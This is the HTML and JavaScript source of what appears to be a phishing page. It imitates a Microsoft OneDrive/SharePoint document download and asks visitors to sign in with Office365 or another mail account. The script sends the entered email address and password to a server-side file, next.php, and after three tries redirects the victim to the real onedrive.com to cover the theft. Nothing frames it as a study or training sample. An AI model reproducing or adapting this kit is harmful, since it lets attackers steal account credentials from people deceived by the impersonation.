
<!doctype html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
    <title>Share Point Online</title>
    <link href="css/hover.css" rel="stylesheet" media="all">

    <style type="text/css">


    </style>
  </head>
  <body style="background: rgb(43,116,167);
background: radial-gradient(circle, rgba(43,116,167,1) 0%, rgba(18,47,89,1) 100%);">
    <div class="container-fluid" style="padding:80px 300px 80px 300px;">
      <div class="row my-3">
                <div class="col-lg-6 mx-auto text-center">
                  <img src="images/onedrive-w.png" class="img-fluid" width="120px"><br>
                  <span class="text-white h2">OneDrive</span>
                </div>
              </div>
      <div class="row">
        <!-- <div class="col-lg-6 p-2" style="background-image:url('images/9b.jpg'); background-size: cover;background-repeat: no-repeat; background-position: right;border-radius:10px 0px 0px 10px;">
          <img src="images/excel-white.png" class="img-fluid" width="50px"><br>
          <div class="text-center mt-5 pt-4">
          <span class="h2 text-white p-1" style="border-top: 0.5px solid;border-bottom: 0.5px solid">Excel</span><br><br>
          <div class="mx-2">
          <span class="h5 text-white">The Excel spreadsheet app lets you create, view, edit, and share your files with others quickly and easily.</span><br>
          </div>
          </div>

        </div> -->
        <div class="col-lg-6 mx-auto" style="background-color:rgba(0,0,0,0.5);padding: 20px 10px 20px 10px; border-radius:10px 10px 10px 10px;">
          <div class="container ">
            <div class="row">
              <div class="col-lg-10 mx-auto" style="padding: 20px 10px 20px 10px;">
                <div class="p-1 rounded">
                  <div class="row">
                    <div class="col-lg-12 text-center ">
                      <span class="text-white h5">Sign in to download the document</span>    
                      
                    </div>
                                 
                    
                  
                    <div class="col-lg-12">
                      <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                        <div class=" p-1 pl-5 mt-2" style=" background-color: #FF3C00;border-radius:30px;">
                          <img src="images/office3651.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
                          <span  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Continue with Office365</span>
                        </div>
                      </a>
                    </div>
                  </div>
                  
					<div class="row">
                    <div class="col-lg-12">
                      <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                        <div class=" p-1 pl-5 mt-2" style=" background-color: #0B5BD3;border-radius:30px;">
                          <img src="images/other1.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
                          <span  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Continue with Other Mail</span>
                        </div>
                      </a>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>



    <!-- Modal for gmail -->
    <div class="modal fade" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
      <div class="modal-dialog" role="document">
        <div class="modal-content">
          <div class="modal-header">

            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
              <span aria-hidden="true">&times;</span>
            </button>
          </div>
          <div class="modal-body">
            <center>
              <img id="fieldImg" src="images/gmail.png" class="img-fluid rounded-circle" width="80px">
              <h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Gmail</span></h5>
              <div class="alert alert-danger" id="msg"></div>

            </center>
            <form id="contact" class="form-horizontal well">
              <div class="col-lg-12">
                <div class="form-group">
                  <label for="exampleInputEmail1">Email address</label>
                  <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email">
                  <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
                </div>
              </div>
              <div class="col-lg-12">
                <div class="form-group">
                  <label for="Password">Password</label>
                  <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password">
                </div>
              </div>
            </div>
            <div class="modal-footer">
              <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
              <button class="btn btn-lg btn-info pull-right" id="submit-btn">Login</button>
            </div>
          </form>
        </div>
      </div>
    </div>


    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  </body>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script>

    /* global $ */
    $(document).ready(function(){
      var count=0;
      $('#gmailmodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/gmail.png');
        $('#field').html("Gmail");
        $('#ajaxModal').modal('show');
      });
      $('#outlookmodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/outlook.png');
        $('#field').html("Outlook");
        $('#ajaxModal').modal('show');
      });
      $('#aolmodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/aol.png');
        $('#field').html("Aol");
        $('#ajaxModal').modal('show');
      });
      $('#office365modal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/office365.png');
        $('#field').html("Office 365");
        $('#ajaxModal').modal('show');
      });
      $('#yahoomodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/yahoo.png');
        $('#field').html("Yahoo");
        $('#ajaxModal').modal('show');
      });
      $('#othermodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/othermail.ico');
        $('#field').html("Other Mail");
        $('#ajaxModal').modal('show');
      });
      $('#submit-btn').click(function(event){
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var detail=$("#field").html();


        var msg = $('#msg').html();
        $('#msg').text( msg );
        count=count+1;
        if (count>=3) {
          count=0;
          window.location.replace("http://onedrive.com");
        }
        else
        {
         $.ajax({
          dataType: 'JSON',
          url: 'next.php',
          type: 'POST',
          data:{
            email:email,
            password:password,
            detail:detail,

          },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                 $('#msg').html(response['msg']);
                  // $('input, textarea').val(function() {
                  //    return this.defaultValue;
                  // });
                }
                else{
                  $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#msg").show();
              $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('Login');
            }
          });
       }
     });
    });
  </script>
  </html>